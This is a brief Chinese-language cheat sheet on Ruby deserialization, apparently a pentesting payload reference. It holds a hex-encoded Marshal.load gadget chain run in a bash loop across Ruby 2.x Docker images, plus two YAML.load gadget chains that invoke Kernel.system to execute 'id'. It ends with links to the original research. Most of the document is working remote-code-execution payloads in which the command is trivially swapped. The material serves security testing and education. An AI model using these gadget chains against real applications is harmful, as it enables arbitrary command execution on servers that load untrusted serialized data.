# Ruby反序列化

## Marshal.load

脚本生成并验证针对Ruby 2.0至2.5版本的反序列化小部件链

```ruby
for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack("H*")) rescue nil'; done
```

## Yaml.load

易受攻击的代码

```ruby
require "yaml"
YAML.load(File.read("p.yml"))
```

适用于ruby <= 2.7.2的通用小部件：

```ruby
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source::SpecificFile
    spec: &1 !ruby/object:Gem::StubSpecification
      loaded_from: "|id 1>&2"
  - !ruby/object:Gem::Source::SpecificFile
      spec:
```

适用于ruby 2.x - 3.x的通用小部件。

```ruby
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

## 参考资料

- [RUBY 2.X通用RCE反序列化小部件链 - elttam, Luke Jahnke](https://www.elttam.com.au/blog/ruby-deserialization/)
- [通过Ruby YAML.load实现通用RCE - @_staaldraad](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/)
- [在线访问Ruby 2.x通用RCE反序列化小部件链 - PentesterLab](https://pentesterlab.com/exercises/ruby_ugadget/online)
- [通过Ruby YAML.load实现通用RCE（版本> 2.7）- @_staaldraad](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/)

* [通过YAML反序列化实现盲目远程代码执行 - 2021年6月9日](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)